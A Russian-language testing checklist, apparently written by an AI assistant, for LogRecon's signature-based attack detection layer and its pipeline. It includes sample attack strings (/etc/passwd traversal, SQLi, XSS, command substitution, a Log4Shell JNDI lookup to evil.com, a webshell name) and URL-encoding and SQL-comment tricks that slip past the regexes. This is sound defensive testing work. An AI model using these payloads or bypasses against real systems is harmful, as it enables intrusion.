# Чек-лист тестирования LogRecon

Контекст: у нас есть стартовый набор заведомо подозрительных индикаторов
(`signature_rules.py` — path traversal, SQLi, XSS, command injection,
Log4Shell, веб-шеллы, сканеры, чувствительные пути). Это детерминированный
слой, проверяется первым, до любой ML-классификации. Этот чек-лист
проверяет его отдельно, его встраивание в общий пайплайн, и весь пайплайн
целиком — с конкретными условиями прохождения для каждого пункта.

Там, где тест уже прогнан в этой сессии — помечено **[Проверено]** с
фактическим результатом. Остальное — то, что нужно прогнать вручную на
вашей стороне, с точным входом и ожидаемым выходом.

Разделы 5 и часть раздела 9 (непрерывность окна, обучение LogBERT)
касаются Pro-надстройки (слой 4) и применимы только если она установлена
— в open-source ядре этих файлов нет, и это нормально, не повод считать
тест проваленным.

---

## 1. Сигнатурный слой — True Positive

Зачем: убедиться, что каждая категория реально матчится, а не только
первая попавшаяся в списке (баг-эффект "одна сигнатура забивает собой
все остальные").

| № | Категория | Тестовая строка (фрагмент) | Условие прохождения |
|---|---|---|---|
| 1.1 | path_traversal | `GET /../../../../etc/passwd` | `match()` возвращает `('path_traversal', ...)` |
| 1.2 | sql_injection | `?id=1 UNION SELECT user,pass FROM users` | `('sql_injection', 'SQL UNION SELECT')` |
| 1.3 | xss | `?q=<script>alert(1)</script>` | `('xss', 'inline script tag')` |
| 1.4 | command_injection | `?x=$(whoami)` | `('command_injection', 'command substitution')` |
| 1.5 | log4shell | `?x=${jndi:ldap://evil.com/a}` | `('log4shell', 'Log4Shell JNDI lookup')` |
| 1.6 | webshell | `GET /uploads/c99.php` | `('webshell', 'known webshell filename')` |
| 1.7 | scanner_tool | `User-Agent: sqlmap/1.7` в строке лога | `('scanner_tool', ...)` |
| 1.8 | sensitive_path | `GET /.env` | `('sensitive_path', ...)` |

**[Проверено]** 1.1–1.8 и ещё 4 аналогичные строки — все совпали
корректно, 5 бенигн-строк (`/api/orders`, `/static/style.css`,
SSH-логин с паролем, `/api/select-plan`, `/catalog?category=environment`)
— ни одна не дала ложного срабатывания.

Команда для самостоятельного прогона:
```bash
python3 -c "
from signature_rules import match
print(match('ваша тестовая строка здесь'))
"
```

## 2. Сигнатурный слой — False Positive на "подозрительно похожем" бенигн-трафике

Зачем: regex не понимает контекст, только текст. Нужно явно проверить
слова, которые *содержат* опасную подстроку, но не являются атакой.

| Строка | Почему может ложно сработать | Условие прохождения |
|---|---|---|
| `/catalog?category=environment` | содержит "env" | `match()` возвращает `None` (проверено — не матчит, `\.env\b` требует точку перед env) |
| `/blog/javascript-tutorial-for-beginners` | содержит "javascript" | **Нужно проверить** — `javascript:` паттерн требует двоеточие сразу после, но лучше прогнать явно |
| `POST /api/comments {"text": "I love the onload animation"}` | содержит "onload" | **Нужно проверить** — `on(error|load)\s*=` требует `=` сразу после, "onload animation" без `=` не должен матчить, но проверить вживую |
| `GET /docs/union-select-tutorial.html` | содержит "union select" как часть названия статьи | **Нужно проверить** — вероятно ложное срабатывание, `union\s+select` сработает на любом тексте, включая легитимный заголовок статьи про SQL |

Последний пункт — ожидаемый источник ложных срабатываний на любом сайте,
где есть собственная документация/блог про безопасность. Решение не в
regex (невозможно отличить "атака" от "статья про атаку" по тексту
запроса) — если у вас есть такой раздел на сайте, его стоит занести в
`false_positives` через дашборд после первого же срабатывания, это
штатный путь, не баг.

## 3. Известный пробел — обход через кодирование/обфускацию

**[Проверено, реальная находка этой сессии]**:

| Техника обхода | Результат |
|---|---|
| URL-encoded traversal: `%2e%2e%2f%2e%2e%2f` | **не матчится** (`None`) |
| Двойное URL-кодирование: `%252e%252e%252f` | **не матчится** (`None`) |
| SQLi с SQL-комментарием: `UNI/**/ON SEL/**/ECT` | **не матчится** (`None`) |
| SQLi с вариацией регистра: `UnIoN SeLeCt` | матчится корректно (`re.IGNORECASE` уже защищает от этого) |
| XSS без пробела перед `=`: `onerror=alert(1)` | матчится корректно |

Вывод: регистр и отсутствие пробелов уже не обходят сигнатуры, а вот
**URL-кодирование и SQL-комментарии обходят полностью**. Это реальный
пробел, а не гипотетический — для веб-логов URL-кодирование в access
логах является нормой (браузеры и curl кодируют спецсимволы в URL по
умолчанию), так что часть path traversal атак в реальном трафике сигнатуры
сейчас пропустят.

**Что с этим делать** — на выбор, не делаю без вашего решения, так как это
меняет поведение матчера:
- Декодировать `raw` (минимум `urllib.parse.unquote`, при необходимости
  дважды) перед проверкой сигнатур — ловит кодированный traversal, но
  не ловит SQL-комментарии;
- Добавить отдельную нормализацию для SQL (убрать `/**/`, схлопнуть
  пробелы) перед SQLi-паттернами;
- Либо смириться: Isolation Forest и LogBERT всё равно увидят такую
  строку как новую/аномальную (просто без мгновенного флага сигнатуры,
  с задержкой на уровень классификации) — то есть полного прохода мимо
  всех слоёв не происходит, теряется только скорость реакции на этот
  конкретный случай.

## 4. Приоритет — сигнатура не уходит в классификацию

**[Проверено]**: при обученных baseline и LogBERT, строка с path traversal
дала ровно один алерт типа `signature_match` в БД — не было параллельного
`model_anomaly` или `sequence_anomaly` для той же записи. Ответ `/fluentbit`:
`{'signature_matches': 1, 'confirmed_threats': 0, 'suspicious': 0,
'sequence_incidents': 0}`.

Условие прохождения на вашей стороне: после отправки известной атаки в
`/fluentbit`, в ответе `signature_matches >= 1`, и в дашборде запись
появляется **только** в секции "🚨 Известные сигнатуры атак", не
дублируется в "На классификацию".

## 5. Непрерывность окна LogBERT при сигнатурном срабатывании

Зачем: сигнатурная строка не должна "выпадать" из истории источника —
иначе следующие строки того же IP/instance будут оцениваться окном с
дырой.

**[Проверено]**: при сигнатурном совпадении `logbert.check(source, record)`
всё равно вызывается (окно пополняется), просто его вердикт игнорируется
через `continue` до создания отдельного алерта. Дублирования алерта не
происходит (см. пункт 4).

## 6. Отказоустойчивость — сигнатурный слой не зависит от моделей

**[Проверено ранее в этой сессии]**: `signature_match` отработал корректно
даже когда `model.joblib` и `logbert.pt` не существовали вообще — сервис
не падает, сигнатуры продолжают работать, `baseline_ready=False` в ответе
отражает реальное состояние.

Условие прохождения: `rm model.joblib logbert.pt`, перезапустить `ingest`,
убедиться что `/health` отдаёт `baseline_model_loaded: false,
logbert_model_loaded: false`, но POST с атакой из раздела 1 всё равно даёт
`signature_matches: 1`.

## 7. Расширяемость — добавление новой сигнатуры

Условия:
1. Добавить кортеж в `SIGNATURES` в `signature_rules.py`, например:
   `('custom', re.compile(r'ваш_паттерн', re.IGNORECASE), 'описание')`.
2. `python3 -m py_compile signature_rules.py` — без ошибок.
3. Прогнать весь список из раздела 1 ещё раз — ни одна старая категория
   не должна перестать матчиться (проверка, что новый паттерн не "съедает"
   матчинг раньше по списку — в текущей реализации невозможно в принципе,
   `match()` возвращает первое совпадение по порядку списка, но стоит
   перепроверить после накопления большого числа сигнатур).
4. Перезапускать `ingest` не обязательно для прод-кода — модуль
   импортируется заново только при рестарте процесса, так что после
   правки файла контейнер `ingest` нужно перезапустить
   (`docker compose restart ingest`), иначе новая сигнатура не подхватится
   до следующего деплоя.

## 8. Защита `personal_rules.py` от отравления — сценарии для ручного прогона

(Логика уже была протестирована синтетическими векторами в этой сессии;
здесь — версия для ручного прогона через сам дашборд на реальных алертах.)

- [ ] Взять любой алерт из "На классификацию", нажать "⚠️ Реальная угроза".
      Условие: запись переходит в `true_positive_threats`,
      `personal_rules_audit.jsonl` получает строку с `action:
      add_true_positive_threat` и вашим именем из сайдбара.
- [ ] Взять другой, явно похожий по содержанию алерт (например, тот же
      путь с другим query-параметром), попробовать "👍 Это норма".
      Условие: если similarity с только что подтверждённой угрозой > 0.90
      — дашборд показывает ошибку (`RuleRejected`), запись остаётся в
      очереди, в audit-логе появляется `rejected_conflict_false_positive`.
- [ ] Промаркировать 20+ записей подряд как "Это норма" в течение часа.
      Условие: после 20-й — ошибка о превышении лимита
      (`MAX_ADDITIONS_PER_HOUR`), запись №21 остаётся в очереди.
- [ ] Попробовать "Это норма" на алерте, где `raw` короче 3 токенов.
      Условие: `RuleRejected` про специфичность, в очереди запись
      остаётся.

## 9. Сквозной прогон на реальном сервере (консолидация плана из прошлого раза)

- [ ] **Парсер на сэмпле** — выгрузить кусок реальных логов, прогнать
      через `log_parser.py` локально, посчитать % `unrecognized`.
      Условие: < 10% нераспознанных на репрезентативной выборке (на
      Apache/Linux/OpenStack датасетах в этой сессии было 0.4–8%).
- [ ] **Пассивный baseline** — несколько дней реального трафика без
      реакции на алерты, затем `train_baseline.py` + `train_logbert.py`
      на этом окне.
      Условие: после обучения `model_anomaly` не завален (ед. единицы
      в час на спокойном трафике, не сотни).
- [ ] **Контролируемые атаки со своего IP** — прогнать строки из раздела 1
      через реальный Fluent Bit → `/fluentbit`, не через тестовый клиент.
      Условие: каждая появляется в дашборде в разделе "🚨 Известные
      сигнатуры атак" в течение одного цикла `Flush` (по умолчанию 5 сек).
- [ ] **Сетевая изоляция** — с другого хоста `curl` на 8080 (должен не
      отвечать), на 8501 (должен не отвечать без SSH-туннеля), изнутри
      контейнера `ingest` — `curl` на внешний домен (должен не проходить,
      `internal: true`).
      Условие: все три — как описано, это не проверялось вживую
      (в песочнице нет Docker), первый реальный прогон будет здесь.
- [ ] **Восстановление после рестарта Fluent Bit** — перезапустить
      контейнер `fluent-bit`, убедиться что офсет в
      `./fluent-bit-state/tail.db` не даёт повторно обработать уже
      прочитанные строки (не должно быть дублей алертов за старый период
      после рестарта).
